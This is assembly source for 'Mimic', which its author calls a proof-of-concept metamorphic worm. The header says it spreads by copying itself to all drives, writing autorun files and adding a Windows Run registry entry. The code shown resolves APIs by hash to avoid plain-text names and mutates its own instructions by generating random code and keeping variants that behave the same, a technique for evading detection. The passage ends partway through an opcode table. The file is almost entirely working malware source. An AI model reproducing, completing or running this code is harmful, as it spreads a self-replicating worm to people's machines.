;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;
;; Mimic
;; by Dr. Theodore Spankman
;; December 2010
;;
;;
;; This is a proof-of-concept worm for the technique descriped in an
;; article "Code Mutations via Behaviour Analysis".
;;
;; The main idea: The worm analyses the behaviour of its own code, then
;; creates random code and analyses that behaviour, too. If the behaviour
;; is the same, the original code will be substituated by the new ranom code.
;; It can analyse register operations, memory operations and stack operations.
;; For more information, see the article!
;;
;; The worm spreads via copying itself to all fixed and removeable drives,
;; creating an autostart file at removeable drives, and writing a registry
;; entry to start at every windows startup.
;;
;; The worm uses a simple 16bit hash-algorithm to find the APIs in the DLLs,
;; so no need to use hardcoded API names.
;;
;;
;;
;;
;; This is version 0.01, it is probably quite buggy - even I tried my best to
;; prevent that (within the given amount of time) - so dont blame me!
;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


include '..\FASM\INCLUDE\win32ax.inc'

macro cc restr*, instr*, op1, op2
{
    ; Macro for padding commands to 8byte each and for
    ; adding the restrictions to the GlobalBehaviourTableList

    local StartCommand, EndCommand
    StartCommand:
    if op2 eq
	if op1 eq
	    instr
	else
	    instr op1
	end if
    else
	instr op1,op2
    end if
    EndCommand:
    times (8-EndCommand+StartCommand): nop	    ; padding

    match any, GlobalBehaviourTableList 	    ; Add further elements to list
    \{
	GlobalBehaviourTableList equ GlobalBehaviourTableList,restr
    \}

    match , GlobalBehaviourTableList		    ; Add first element to list
    \{
	GlobalBehaviourTableList equ restr
    \}
}

macro VEH_TRY c*
{
	cc rNoEmul,  call,    MirrorTheStack

	cc rPSI,     mov,     dword[sESP], esp

	cc rNoRes,   push,    VEH_Handler#c
	cc rNoRes,   push,    0x1
	cc rNoEmul,  stdcall, dword[AddVectoredExceptionHandler]
	cc rNoRes,   mov,     dword[hVEH], eax
}


macro VEH_EXCEPTION c*
{
	cc rNoEmul,  call,    RestoreTheStack
	cc rA,	     xor,     eax, eax
	cc rNoRes,   mov,     dword[bException#c], eax
	cc rNoEmul,  jmp,     VEH_NoException#c

     VEH_Handler#c:
	cc rA,	     mov,     eax, dword[hDataMirror]
	cc rAB,      mov,     ebx, dword[hDataMirror1]

	cc rF,	     cmp,     eax, ebx
	cc rNoEmul,  je,      VEH_HandlerDataMirrorOK#c
	cc rC,	     mov,     ecx, dword[hDataMirror2]
	cc rNoRes,   mov,     dword[hDataMirror], ecx

	VEH_HandlerDataMirrorOK#c:
	cc rNoEmul,  call,    RestoreTheMemory

	cc rNoEmul,  mov,     esp, dword[sESP]

	cc rABCDPSI, mov,     eax, 1
	cc rABCDPSI, mov,     dword[bException#c], eax
	cc rNoEmul,  call,    RestoreTheStack
}


macro VEH_END c*
{
     VEH_NoException#c:
	cc rA,	    mov,     eax, dword[hVEH]
	cc rNoRes,  push,    eax
	cc rNoEmul, stdcall, dword[RemoveVectoredExceptionHandler]
}


.data
DataStart:

	CodeStartInFile EQU 0x600

GlobalBehaviourTableList equ

; eax=A     ebp=P
; ebx=B     esi=S
; ecx=C     edi=I
; edx=D     FLAGS=F

rNoRes	  EQU 00000000b
rA	  EQU 00000001b
rB	  EQU 00000010b
rAB	  EQU 00000011b
rC	  EQU 00000100b
rAC	  EQU 00000101b
rBC	  EQU 00000110b
rABC	  EQU 00000111b
rD	  EQU 00001000b
rAD	  EQU 00001001b
rABD	  EQU 00001011b
rCD	  EQU 00001100b
rACD	  EQU 00001101b
rBCD	  EQU 00001110b
rABCD	  EQU 00001111b
rP	  EQU 00010000b
rAP	  EQU 00010001b
rBP	  EQU 00010010b
rCP	  EQU 00010100b
rDP	  EQU 00011000b
rCDP	  EQU 00011100b
rACP	  EQU 00010101b
rBCP	  EQU 00010110b
rADP	  EQU 00011001b
rBDP	  EQU 00011010b
rBCDP	  EQU 00011110b
rABCDP	  EQU 00011111b
rS	  EQU 00100000b
rAS	  EQU 00100001b
rBS	  EQU 00100010b
rABS	  EQU 00100011b
rCS	  EQU 00100100b
rACS	  EQU 00100101b
rBCS	  EQU 00100110b
rABCS	  EQU 00100111b
rDS	  EQU 00101000b
rADS	  EQU 00101001b
rCDS	  EQU 00101100b
rACDS	  EQU 00101101b
rABCDS	  EQU 00101111b
rPS	  EQU 00110000b
rBPS	  EQU 00110010b
rCPS	  EQU 00110100b
rACPS	  EQU 00110101b
rBCPS	  EQU 00110110b
rDPS	  EQU 00111000b
rABCDPS   EQU 00111111b
rI	  EQU 01000000b
rAI	  EQU 01000001b
rCI	  EQU 01000100b
rACI	  EQU 01000101b
rSI	  EQU 01100000b
rASI	  EQU 01100001b
rABSI	  EQU 01100011b
rCSI	  EQU 01100100b
rACSI	  EQU 01100101b
rDSI	  EQU 01101000b
rADSI	  EQU 01101001b
rCDSI	  EQU 01101100b
rACDSI	  EQU 01101101b
rABCDSI   EQU 01101111b
rPSI	  EQU 01110000b
rAPSI	  EQU 01110001b
rBPSI	  EQU 01110010b
rABPSI	  EQU 01110011b
rACPSI	  EQU 01110101b
rABCPSI   EQU 01110111b
rDPSI	  EQU 01111000b
rADPSI	  EQU 01111001b
rBDPSI	  EQU 01111010b
rCDPSI	  EQU 01111100b
rACDPSI   EQU 01111101b
rBCDPSI   EQU 01111110b
rABCDPSI  EQU 01111111b
rF	  EQU 10000000b
rAF	  EQU 10000001b
rBF	  EQU 10000010b
rABF	  EQU 10000011b
rCF	  EQU 10000100b
rACF	  EQU 10000101b
rABCF	  EQU 10000111b
rDF	  EQU 10001000b
rADF	  EQU 10001001b
rBDF	  EQU 10001010b
rABDF	  EQU 10001011b
rPF	  EQU 10010000b
rAPF	  EQU 10010001b
rBPF	  EQU 10010010b
rACPF	  EQU 10010101b
rBCPF	  EQU 10010110b
rDPF	  EQU 10011000b
rBDPF	  EQU 10011010b
rCDPF	  EQU 10011100b
rSF	  EQU 10100000b
rACSF	  EQU 10100101b
rCDSF	  EQU 10101100b
rACDSF	  EQU 10101101b
rABCDSF   EQU 10101111b
rDPSF	  EQU 10111000b
rCIF	  EQU 11000100b
rCSIF	  EQU 11100100b
rCDSIF	  EQU 11101100b
rACDSIF   EQU 11101101b
rACPSIF   EQU 11110101b
rADPSIF   EQU 11111001b
rBDPSIF   EQU 11111010b
rCDPSIF   EQU 11111100b
rBCDPSIF  EQU 11111110b
rABCDPSIF EQU 11111111b


rNoEmul   EQU 10110101b

		stKey: times 47 db 0x0 ; "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0x0

		hKey  dd 0x0

		hVEH		   dd 0x0
		RandomNumber	   dd 0x0
		tmpAddress	   dd 0x0
		tmpRetVal	   dd 0x0

		hTempAlloc2	   dd 0x0

		hDataMirror	   dd 0x0

		hCreateFileAR	     dd 0x0
		hCreateFileMappingAR dd 0x0

		hExecutionMirror   dd 0x0
		hLBTFileCode	   dd 0x0
		tmpMemProtection   dd 0x0
		hStackMirror	   dd 0x0
		hStackSize	   dd 0x0
		tmpAddress1	   dd 0x0
		hStackStart	   dd 0x0
		tmpGBT		   db 0x0
		hMyFileName	   dd 0x0
		SpaceForHDC:	   dd 0x0   ; should be 0x0, C:\
		RandomFileName: times 13 db 0x0

		SpaceForHDC2:	   dd 0x0   ; should be 0x0, X:\
		RandomFileName2:times 13 db 0x0

		WormCodeStart	dd 0x0
		RndNumCycle	dd 0x0

		hDataMirror1 dd 0x0

		hCreateFileRndFile dd 0x0
		dFileSize	   dd 0x0
		hCreateMapRndFile  dd 0x0
		tmpAddress2	   dd 0x0
		hMapViewRndFile    dd 0x0


	hTempAlloc1	  dd 0x0

		stAutoRunContent: times 52 db 0x0

		bExceptionFC1 db 0x0
		bExceptionRC1 db 0x0
		bExceptionFC2 db 0x0
		bExceptionRC2 db 0x0
		bExceptionFC2SIM db 0x0
		bExceptionRC2SIM db 0x0

		BBExceptionCount  db 0x0
		hRandomizedData   dd 0x0
		_VirtualProtect1  dd 0x0

		stAutorunWithDrive db 0x0, 0x0, 0x0	; "X:\"
		stAutoruninf: times 12 db 0x0
			      ; "autorun.inf"

		hRandomizedData1 dd 0x0
		tmpDWA dd 0x0
		tmpDWB dd 0x0
		tmpDWC dd 0x0
		CGPushPop db 0x0
	tmpReg4Mirror:
		tmpDW1 dd 0x0
		tmpDW2 dd 0x0
		tmpDW3 dd 0x0
		tmpDW4 dd 0x0
		tmpDW5 dd 0x0
		tmpDW6 dd 0x0
		tmpDW7 dd 0x0
		tmpDW8 dd 0x0

		sESP dd 0x0

		rEAX dd 0x0
		rECX dd 0x0
		rEDX dd 0x0
		rEBX dd 0x0
		rEBP dd 0x0
		rESI dd 0x0
		rEDI dd 0x0

		dd 0x0, 0x0, 0x0, 0x0

		hDataMirror2 dd 0x0

		hPrepareRegistersAndTable dd 0x0
		hMirrorTheMemory	  dd 0x0

	_VirtualAlloc1	dd 0x0

	_DLLkernel32:	 times 13 db 0x0
	hDLLkernel32	 dd 0x0

	_DLLadvapi32:	 times 13 db 0x0
	hDLLadvapi32	 dd 0x0

	hKernelPE    dd 0x0

	hAddressTable dd 0x0
	hNamePointerTable dd 0x0
	hOrdinalTable dd 0x0

	APINumbersKernel EQU (APIMagicNumbersKernel32End-APIMagicNumbersKernel32)/4

	APIMagicNumbersKernel32:
;                hashAddVectoredExceptionHandler dd 0x85D3
						    ; The VEH APIs are directly redirected to ntdll, so the entry in the AddressTable is not valid
						    ; this counts for XP, Vista and probably Vista+, too
		hashCloseHandle     dd 0xA2C8
		hashCopyFileA	    dd 0x8ADF
		hashCreateFileA     dd 0x89DE
		hashCreateFileMappingA dd 0xD198
		hashGetCommandLineA dd 0x8287
		hashGetDriveTypeA   dd 0x6586
		hashGetFileSize     dd 0x87DF
		hashGetTickCount    dd 0xEBAE
		hashMapViewOfFile   dd 0xA6D0
;                hashRemoveVectoredExceptionHandler dd 0xB98C
		hashSetErrorMode    dd 0xCF8D
		hashSleep	    dd 0x6EAA
		hashUnmapViewOfFile dd 0xA5F9
		hashVirtualAlloc    dd 0xC563
		hashVirtualFree     dd 0x88F0
		hashVirtualProtect  dd 0xAE67
	APIMagicNumbersKernel32End:

	APIAddressesKernel:
;                _AddVectoredExceptionHandler dd 0x0
		_CloseHandle	 dd 0x0
		_CopyFileA	 dd 0x0
		_CreateFileA	 dd 0x0
		_CreateFileMappingA dd 0x0
		_GetCommandLineA dd 0x0
		_GetDriveTypeA	 dd 0x0
		_GetFileSize	 dd 0x0
		_GetTickCount	 dd 0x0
		_MapViewOfFile	 dd 0x0
;                _RemoveVectoredExceptionHandler dd 0x0
		_SetErrorMode	 dd 0x0
		_Sleep		 dd 0x0
		_UnmapViewOfFile dd 0x0
		_VirtualAlloc	 dd 0x0
		_VirtualFree	 dd 0x0
		_VirtualProtect  dd 0x0

	APINumbersAdvapi EQU (APIMagicNumbersAdvapi32End-APIMagicNumbersAdvapi32)/4

	APIMagicNumbersAdvapi32:
		hashRegCloseKey       dd 0x84C2
		hashRegCreateKeyExA   dd 0xAC9F
		hashRegSetValueExA    dd 0xC655
	APIMagicNumbersAdvapi32End:

	APIAddressesAdvapi:
		_RegCloseKey	  dd 0x0
		_RegCreateKeyExA  dd 0x0
		_RegSetValueExA   dd 0x0



	APICurrentMagicNum dd 0x0
	APICurrentNumber   dd 0x0
	APICurrentAddress  dd 0x0

; ###########################################################################
; ###########################################################################
; #####
; #####   Local BehaviourTable
; #####



LocalBehaviourTable:
	CommandNumber	   EQU (EndPaddedCommands-StartPaddedCommands)/8
	BehaviourTableSize EQU 18*4
			   ; Has to be a mulitple of 4!

		; Each behaviour Block consists of:
		; Registers: 9*4=36 byte
		;  0x00 dd EAX
		;  0x04 dd EBX
		;  0x08 dd ECX
		;  0x0C dd EDX
		;  0x10 dd EBP
		;  0x14 dd ESI
		;  0x18 dd EDI
		;  0x1C dd FLAGS
		;  0x20 dd ESP

		; Memory: 2*4*4=8*4=32 byte:
		;  0x24 dd MemOffset1
		;  0x28 dword[MemOffset1]
		;  0x2C dd MemOffset2
		;  0x30 dword[MemOffset2]
		;  0x34 dd MemOffset3
		;  0x38 dword[MemOffset3]
		;  0x3C dd MemOffset4
		;  0x40 dword[MemOffset4]

		; Stack: 1*4=4 byte
		; (could be extented, but i like it that way more :) )
		;  0x44 STACK change (if push is used)

	TempBehaviourTable: times BehaviourTableSize db 0x0

	BBTableFileCode: times BehaviourTableSize db 0x0
	BBTableRandomCode: times BehaviourTableSize db 0x0



; #####
; #####   Local BehaviourTable
; #####
; ###########################################################################
; ###########################################################################


; ###########################################################################
; ###########################################################################
; #####
; #####   Buffers for execution
; #####

		RandomCodeBufferSize EQU 0x08
					 ; At some parts, the code relies on
					 ; that value, so check that when you
					 ; change it.

		CodeExecDifference EQU (RandomCodeExecutionWithoutPRAT-RandomCodeExecution)
		CodeExecSize EQU (RandomCodeExectionEnd-RandomCodeExecution)


RandomCodeExecution:
		call	dword[hPrepareRegistersAndTable]
   RandomCodeExecutionWithoutPRAT:

			call	dword[hMirrorTheMemory]

		RandomCode:
;                add al, 1
;                 mov byte[tmpDWA], 33
			times RandomCodeBufferSize db 0x90
		RC_End:
		times (8-RC_End+RandomCode): nop	  ; padding
		RC_Padding:	times 8 db 0x90 ; If error occure and malicous code is generated
						; As buffer that this malicous code does not "overwrite" the opcodes of the next "call"
		call	dword[hAnalyseBehaviourOfCode]
   ret
RandomCodeExectionEnd:


FileCodeExection:
		call	dword[hPrepareRegistersAndTable]
   FileCodeExecutionWithoutPRAT:

			call	dword[hMirrorTheMemory]

		BufferForCode:

			times RandomCodeBufferSize db 0x90
		FC_Padding:	times 8 db 0x90 ; If error occure and malicous code is generated
						; As buffer that this malicous code does not "overwrite" the opcodes of the next "call"
		call	dword[hAnalyseBehaviourOfCode]
   ret
FileCodeExectionEnd:



; #####
; #####   Buffers for execution
; #####
; ###########################################################################
; ###########################################################################




DataEnd:

	times 8 db 0x0


.code
CodeStart:
; Temp Code

StartPaddedCommands:
		cc rNoEmul, call,    GetAllAPIAddresses 	; Will receive the addresses of all
								; required APIs from kernel32.dll and advapi32.dll
								; using a 16bit hash for each API name. The hash
								; will be calculated with a simple XOR/SUB/ADD algorithm

		cc rNoEmul, stdcall, dword[_GetTickCount]
		cc rNoRes,  mov,     dword[RandomNumber], eax

		cc rNoRes,  push,    0x8007
		cc rNoEmul, stdcall, dword[_SetErrorMode]

		cc rNoEmul, stdcall, dword[_GetCommandLineA]
		cc rNoRes,  mov,     dword[hMyFileName], eax
		cc rF,	    cmp,     byte[eax], '"'
		cc rNoEmul, jne,     FileNameIsFine
		cc rA,	    inc,     eax
		cc rA,	    mov,     dword[hMyFileName], eax

		FindFileNameLoop:
			cc rA,	     inc,     eax
			cc rAF,      cmp,     byte[eax], '"'
		cc rNoEmul, jne,     FindFileNameLoop

		cc rNoRes,  mov,     byte[eax], 0x0
		FileNameIsFine:

		cc rNoEmul, call,    CopyFileAndRegEntry

		cc rNoRes,  push,    PAGE_READONLY
		cc rNoRes,  push,    MEM_COMMIT
		cc rNoRes,  push,    (DataEnd-DataStart)
		cc rNoRes,  push,    0x0		     ; lpAddress - optional
		cc rNoEmul, stdcall, dword[_VirtualAlloc]    ; For mirroring the Memory
		cc rA,	    mov,     dword[hDataMirror], eax
		cc rA,	    mov,     dword[hDataMirror1], eax	  ; This may be destroyed by a random
		cc rNoRes,  mov,     dword[hDataMirror2], eax	  ; code. Saving it three times gives
								  ; the possibility to find the true one
								  ; anyway.

		cc rA,	    mov,     eax, dword[fs:0x4]      ; TIB: Top of stack
		cc rAB,     mov,     ebx, dword[fs:0x8]      ; TIB: Current bottom of stack
		cc rAB,     mov,     dword[hStackStart], ebx

		cc rA,	    sub,     eax, ebx		     ; eax=Size of current stack
		cc rA,	    mov,     dword[hStackSize], eax  ; Save size of stack

		cc rNoRes,  push,    PAGE_READONLY
		cc rNoRes,  push,    MEM_COMMIT
		cc rNoRes,  push,    eax
		cc rNoRes,  push,    0x0		     ; lpAddress - optional
		cc rNoEmul, stdcall, dword[_VirtualAlloc]    ; For mirroring the Stack
		cc rNoRes,  mov,     dword[hStackMirror], eax


		cc rNoRes,  push,    PAGE_READONLY
		cc rNoRes,  push,    MEM_COMMIT
		cc rNoRes,  push,    (DataEnd-DataStart)
		cc rNoRes,  push,    0x0
		cc rNoEmul, stdcall, dword[_VirtualAlloc]	      ; For generating a randomized memory
		cc rA,	    mov,     dword[hRandomizedData], eax
		cc rA,	    mov,     dword[hRandomizedData1], eax
		cc rNoEmul, call,    CreateRandomizedData

		cc rNoRes,  push,    PAGE_EXECUTE_READ
		cc rNoRes,  push,    MEM_COMMIT
		cc rNoRes,  push,    CodeExecSize
		cc rNoRes,  push,    0x0
		cc rNoEmul, stdcall, dword[_VirtualAlloc]     ; For execution of code - to prevent self-destruction :D
		cc rNoRes,  mov,     dword[hExecutionMirror], eax


		cc rNoRes,  push,    PAGE_READWRITE
		cc rNoRes,  push,    MEM_COMMIT
		cc rNoRes,  push,    2*4*4	     ; Memory BT: 4 times: 2*dd = 32byte
		cc rNoRes,  push,    0x0
		cc rNoEmul, stdcall, dword[_VirtualAlloc]
		cc rA,	    mov,     dword[hTempAlloc1], eax
		cc rNoRes,  mov,     dword[hTempAlloc2], eax	    ; eax=Temp.VirtualAlloc


		cc rA,	    mov,     eax, PrepareRegistersAndTable
		cc rNoRes,  mov,     dword[hPrepareRegistersAndTable], eax
		cc rA,	    mov,     eax, MirrorTheMemory
		cc rNoRes,  mov,     dword[hMirrorTheMemory], eax

		cc rNoEmul, call,    CreateRandomRegisters
		cc rNoEmul, call,    MakeBehaviourTableOfOwnCode


; ###########################################################################
; ###########################################################################
; #####
; #####   Random Code Execution Loop
; #####

	cc rD,	    xor, edx, edx

     LoopRnd:
	cc rCD,      xor, ecx, ecx

	LLR:
	cc rNoEmul,  pushad

		cc rNoEmul,  call,    CreateRandomCode

      ;  #####################################################################
      ;  ########
      ;  # TRY
      ;  # {
      ;  #
	    VEH_TRY RC1

		cc rA,	    mov,     eax, TempBehaviourTable
		cc rA,	    mov,     dword[tmpAddress], eax
		cc rA,	    mov,     dword[tmpAddress1], eax
		cc rNoRes,  mov,     dword[tmpAddress2], eax
		cc rA,	    xor,     eax, eax
		cc rAB,     mov,     ebx, RandomCodeExecution
		cc rNoEmul, call,    GenerateExecuteableCodeInMemory	  ; Call the Function in data section
							     ; Can not be written in .code as it's write-protected
							     ; which is important for the random-code executions
							     ; (to not destroy entire code).
		cc rNoEmul, call,    dword[hExecutionMirror] ; Can not execute it in .data section as it's not
							     ; write protected, and the random code can (and will)
							     ; overwrite itself (self-destruction). Solution:
							     ; Virtual Allocated Memory with variable Protection

      ; #
      ; #  }
      ; #  CATCH
      ; #  {
      ; #

	    VEH_EXCEPTION RC1

	    VEH_END RC1
      ; #
      ; # }
      ; ########
      ; #####################################################################


		cc rNoEmul, call,    CompareCodeBTwithRandomBT

	cc rNoEmul, popad



	cc rC,	    inc, ecx
	cc rCF,     cmp, ecx, 0x5
    cc rNoEmul, jb, LLR


	cc rNoEmul, pushad

	cc rNoRes,  push, 10
	cc rNoEmul, stdcall, dword[_Sleep]
	cc rNoEmul, popad

	cc rD,	    inc, edx
	cc rDF,     cmp, edx, 50
  cc rNoEmul,  jb,  LoopRnd

	cc rNoEmul, call,    SpreadThisKitty

	cc rD,	    xor,     edx, edx

cc rNoEmul, jmp,     LoopRnd

; #####
; #####   Random Code Execution Loop
; #####
; ###########################################################################
; ###########################################################################




; ###########################################################################
; ###########################################################################
; #####
; #####   Generate Random Code in allocated Memory for Execution
; #####

GenerateExecuteableCodeInMemory:
; In: eax=0 ... Write from RandomCodeExecution1-RandomCodeExecution1End
;     else: eax=(RandomCodeExecutionWithoutPRAT-RandomCodeExecution1)
;     ebx: Source (RandomCodeExecution or FileCodeExection)
; This function is used to generate the random code in memory, because .data section
; is READ/WRITE/EXECUTE, hence the random code can (and will) overwrite itself.
; Solution: It will be executed in a READ/EXECUTE memory.

	cc rB,	    push,    eax
	cc rNoRes,  push,    ebx

	cc rNoRes,  push,    tmpMemProtection
	cc rNoRes,  push,    PAGE_READWRITE
	cc rNoRes,  push,    CodeExecSize
	cc rNoRes,  push,    dword[hExecutionMirror]
	cc rNoEmul, stdcall, dword[_VirtualProtect]


	cc rB,	    pop,     ebx
	cc rAB,     pop,     eax

	cc rABC,    xor,     ecx, ecx
	cc rACS,    mov,     esi, ebx
	cc rCS,     add,     esi, eax
	cc rCSI,    mov,     edi, dword[hExecutionMirror]

     GenerateExecuteableCodeInMemoryMore:
	cc rACSI,   mov,     eax, dword[esi]
	cc rCSI,    mov,     dword[edi], eax
	cc rCSI,    add,     esi, 0x4
	cc rCSI,    add,     edi, 0x4
	cc rCSI,    add,     ecx, 0x4
	cc rCSIF,   cmp,     ecx, CodeExecSize
     cc rNoEmul, jb, GenerateExecuteableCodeInMemoryMore

	cc rNoRes,  push,    tmpMemProtection
	cc rNoRes,  push,    PAGE_EXECUTE_READ
	cc rNoRes,  push,    CodeExecSize
	cc rNoRes,  push,    dword[hExecutionMirror]
	cc rNoEmul, stdcall, dword[_VirtualProtect]

cc rNoEmul, ret

; #####
; #####   Generate Random Code in allocated Memory for Execution
; #####
; ###########################################################################
; ###########################################################################




; ###########################################################################
; ###########################################################################
; #####
; #####   Linear Congruent Generator (Random Number Generator)
; #####

GetRandomNumber:
		cc rNoEmul, pushad
		cc rD,	    xor,     edx, edx
		cc rAD,     mov,     eax, dword[RandomNumber]

		cc rABD,    mov,     ebx, 1103515245
		cc rA,	    mul,     ebx	    ; EDX:EAX = EDX:EAX * EBX

		cc rA,	    add,     eax, 12345
		cc rNoRes,  mov,     dword[RandomNumber], eax
		cc rNoEmul, popad
cc rNoEmul, ret


GetGoodRandomNumber:
		cc rNoEmul, pushad
		cc rC,	    mov,     ecx, dword[RandomNumber]
		cc rC,	    shr,     ecx, 11
		cc rC,	    and,     ecx, 0xF
		cc rC,	    inc,     ecx
		GetGoodRandomNumberMore:			; The linear congruent generator has some serios problems when
								; one needs "good" random numbers. There were patterns in the
								; numbers that leaded to wrong results
		cc rNoEmul, call,   GetRandomNumber
		cc rCF,     dec,     ecx
		cc rNoEmul, jnz,     GetGoodRandomNumberMore
		cc rNoEmul, popad
cc rNoEmul, ret


CreateSpecialRndNumber:
; in: ebx, ecx
; out: edx=(rand()%ebx + ecx)

		cc rNoEmul, call,    GetRandomNumber

		cc rBCD,    xor,     edx, edx
		cc rABCD,   mov,     eax, dword[RandomNumber]
		cc rCD,     div,     ebx

		cc rD,	    add,     edx, ecx
cc rNoEmul, ret

BBSimSpecialRndNum:
		cc rC,	     xor,     ecx, ecx
		cc rBC,      mov,     ebx, 50
		cc rNoEmul,  call,    CreateSpecialRndNumber
		cc rD,	     sub,     dl, 25
		cc rAD,      mov,     eax, edx
cc rNoEmul, ret

; #####
; #####   Linear Congruent Generator (Random Number Generator)
; #####
; ###########################################################################
; ###########################################################################




; ###########################################################################
; ###########################################################################
; #####
; #####   Random Code Generator
; #####

CreateRandomCode:
; 0x00 ... add Mem8,  Reg8       0x00 (0x00-0xBF)     OPMem8Reg8
; 0x00 ... add Reg8,  Reg8       0x00 (0xC0-0xFF)     OPReg8Reg8
; 0x01 ... add Mem32, Reg32      0x01 (0x00-0xBF)     OPMem32Reg32
; 0x01 ... add Reg32, Reg32      0x01 (0xC0-0xFF)     OPReg32Reg32
; 0x02 ... add Reg8,  Mem8       0x02 (0x00-0xBF)     OPMem8Reg8
; 0x02 ... add Reg8,  Reg8       0x02 (0xC0-0xFF)     OPReg8Reg8
; 0x03 ... add Reg32, Mem32      0x03 (0x00-0xBF)     OPMem32Reg32
; 0x03 ... add Reg32, Reg32      0x03 (0xC0-0xFF)     OPReg32Reg32
; 0x04 ... add al,  Imm8         0x04 (0x00-0xFF)     OPAlImm8
; 0x05 ... add eax, Imm32        0x05 (0x00-0xFF)     OPEaxImm32
; NOT USED: 0x06, 0x07 - push ES | pop ES
; 0x08 ... or  Mem8,  Reg8       0x08 (0x00-0xBF)     OPMem8Reg8
; 0x08 ... or  Reg8,  Reg8       0x08 (0xC0-0xFF)     OPReg8Reg8
; 0x09 ... or  Mem32, Reg32      0x09 (0x00-0xBF)     OPMem32Reg32
; 0x09 ... or  Reg32, Reg32      0x09 (0xC0-0xFF)     OPReg32Reg32
; 0x0A ... or  Reg8,  Mem8       0x0A (0x00-0xBF)     OPMem8Reg8
; 0x0A ... or  Reg8,  Reg8       0x0A (0xC0-0xFF)     OPReg8Reg8
; 0x0B ... or  Reg32, Mem32      0x0B (0x00-0xBF)     OPMem32Reg32
; 0x0B ... or  Reg32, Reg32      0x0B (0xC0-0xFF)     OPReg32Reg32
; 0x0C ... or  al,  Imm8         0x0C (0x00-0xFF)     OPAlImm8
; 0x0D ... or  eax, Imm32        0x0D (0x00-0xFF)     OPEaxImm32
; NOT USED: 0x0E, 0x0F - push CS | pop CS
; 0x10 ... adc Mem8,  Reg8       0x10 (0x00-0xBF)     OPMem8Reg8
; 0x10 ... adc Reg8,  Reg8       0x10 (0xC0-0xFF)     OPReg8Reg8
; 0x11 ... adc Mem32, Reg32      0x11 (0x00-0xBF)     OPMem32Reg32
; 0x11 ... adc Reg32, Reg32      0x11 (0xC0-0xFF)     OPReg32Reg32
; 0x12 ... adc Reg8,  Mem8       0x12 (0x00-0xBF)     OPMem8Reg8
; 0x12 ... adc Reg8,  Reg8       0x12 (0xC0-0xFF)     OPReg8Reg8
; 0x13 ... adc Reg32, Mem32      0x13 (0x00-0xBF)     OPMem32Reg32
; 0x13 ... adc Reg32, Reg32      0x13 (0xC0-0xFF)     OPReg32Reg32
; 0x14 ... adc al,  Imm8         0x14 (0x00-0xFF)     OPAlImm8
; 0x15 ... adc eax, Imm32        0x15 (0x00-0xFF)     OPEaxImm32
; NOT USED: 0x16, 0x17 - push SS | pop SS
; 0x18 ... sbb Mem8,  Reg8       0x18 (0x00-0xBF)     OPMem8Reg8
; 0x18 ... sbb Reg8,  Reg8       0x18 (0xC0-0xFF)     OPReg8Reg8
; 0x19 ... sbb Mem32, Reg32      0x19 (0x00-0xBF)     OPMem32Reg32
; 0x19 ... sbb Reg32, Reg32      0x19 (0xC0-0xFF)     OPReg32Reg32
; 0x1A ... sbb Reg8,  Mem8       0x1A (0x00-0xBF)     OPMem8Reg8
; 0x1A ... sbb Reg8,  Reg8       0x1A (0xC0-0xFF)     OPReg8Reg8
; 0x1B ... sbb Reg32, Mem32      0x1B (0x00-0xBF)     OPMem32Reg32
; 0x1B ... sbb Reg32, Reg32      0x1B (0xC0-0xFF)     OPReg32Reg32
; 0x1C ... sbb al,  Imm8         0x1C (0x00-0xFF)     OPAlImm8
; 0x1D ... sbb eax, Imm32        0x1D (0x00-0xFF)     OPEaxImm32
; NOT USED: 0x16, 0x17 - push DS | pop DS
; 0x20 ... and Mem8,  Reg8       0x20 (0x00-0xBF)     OPMem8Reg8
; 0x20 ... and Reg8,  Reg8       0x20 (0xC0-0xFF)     OPReg8Reg8
; 0x21 ... and Mem32, Reg32      0x21 (0x00-0xBF)     OPMem32Reg32
; 0x21 ... and Reg32, Reg32      0x21 (0xC0-0xFF)     OPReg32Reg32
; 0x22 ... and Reg8,  Mem8       0x22 (0x00-0xBF)     OPMem8Reg8
; 0x22 ... and Reg8,  Reg8       0x22 (0xC0-0xFF)     OPReg8Reg8
; 0x23 ... and Reg32, Mem32      0x23 (0x00-0xBF)     OPMem32Reg32
; 0x23 ... and Reg32, Reg32      0x23 (0xC0-0xFF)     OPReg32Reg32
; 0x24 ... and al,  Imm8         0x24 (0x00-0xFF)     OPAlImm8
; 0x25 ... and eax, Imm32        0x25 (0x00-0xFF)     OPEaxImm32
; NOT USED: 0x26 (Superfluous) prefix
; 0x27 ... daa                   0x27                 SingleByteCommand
; 0x28 ... sub Mem8,  Reg8       0x28 (0x00-0xBF)     OPMem8Reg8
; 0x28 ... sub Reg8,  Reg8       0x28 (0xC0-0xFF)     OPReg8Reg8
; 0x29 ... sub Mem32, Reg32      0x29 (0x00-0xBF)     OPMem32Reg32
; 0x29 ... sub Reg32, Reg32      0x29 (0xC0-0xFF)     OPReg32Reg32
; 0x2A ... sub Reg8,  Mem8       0x2A (0x00-0xBF)     OPMem8Reg8
; 0x2A ... sub Reg8,  Reg8       0x2A (0xC0-0xFF)     OPReg8Reg8
; 0x2B ... sub Reg32, Mem32      0x2B (0x00-0xBF)     OPMem32Reg32
; 0x2B ... sub Reg32, Reg32      0x2B (0xC0-0xFF)     OPReg32Reg32
; 0x2C ... sub al,  Imm8         0x2C (0x00-0xFF)     OPAlImm8
; 0x2D ... sub eax, Imm32        0x2D (0x00-0xFF)     OPEaxImm32
; NOT USED: 0x2E (Superfluous) prefix
; 0x2F ... das                   0x2F                 SingleByteCommand
; 0x30 ... xor Mem8,  Reg8       0x30 (0x00-0xBF)     OPMem8Reg8
; 0x30 ... xor Reg8,  Reg8       0x30 (0xC0-0xFF)     OPReg8Reg8
; 0x31 ... xor Mem32, Reg32      0x31 (0x00-0xBF)     OPMem32Reg32
; 0x31 ... xor Reg32, Reg32      0x31 (0xC0-0xFF)     OPReg32Reg32
; 0x32 ... xor Reg8,  Mem8       0x32 (0x00-0xBF)     OPMem8Reg8
; 0x32 ... xor Reg8,  Reg8       0x32 (0xC0-0xFF)     OPReg8Reg8
; 0x33 ... xor Reg32, Mem32      0x33 (0x00-0xBF)     OPMem32Reg32
; 0x33 ... xor Reg32, Reg32      0x33 (0xC0-0xFF)     OPReg32Reg32
; 0x34 ... xor al,  Imm8         0x34 (0x00-0xFF)     OPAlImm8
